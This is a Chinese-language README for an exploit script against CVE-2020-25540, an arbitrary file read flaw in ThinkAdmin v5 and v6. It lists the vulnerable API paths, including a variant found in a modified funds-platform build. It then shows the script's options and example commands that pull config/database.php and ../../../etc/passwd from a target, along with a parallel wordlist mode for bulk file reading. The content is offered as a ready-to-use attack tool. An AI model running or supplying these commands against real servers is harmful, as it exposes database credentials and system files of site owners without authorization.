# cve-2020-25540

> 该脚本用来对ThinkAdmin v5，v6版本进行任意文件读取的漏洞利用

==其中接口路径在不同的版本间可能存在差异（一些基于原版ThinkAdmin二开的）==

- 原版的接口是：/admin.html?s=admin/api.Update/get?/encode/xxxx
- 我这一版的是（某资金盘二开的）：/admin.html?s=admin/api.Update/read?encode=xxxx

**基本用法**

```bash
usage: cve-2020-25540.py [-h] -t TARGET [-f FILE] [-w WORDLIST] [-b BASE_PATH]
                         [-p PARALLEL]

通过 API 读取文件并获取响应

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        目标 IP 地址或域名
  -f FILE, --file FILE  要读取的文件路径
  -w WORDLIST, --wordlist WORDLIST
                        字典文件路径，提供多个文件路径或文件名
  -b BASE_PATH, --base-path BASE_PATH
                        基础路径，用于拼接字典文件中的路径
  -p PARALLEL, --parallel PARALLEL
                        并行线程数
```

```bash
python3 cve-2020-25540.py -t "https://xxx.xx" -f "config/database.php"
python3 cve-2020-25540.py -t "https://xxx.xx" -f "../../../etc/passwd"
python3 cve-2020-25540.py -t "https://xxx.xx" -b "../../../etc/" -w wordlist.txt -p 10
```
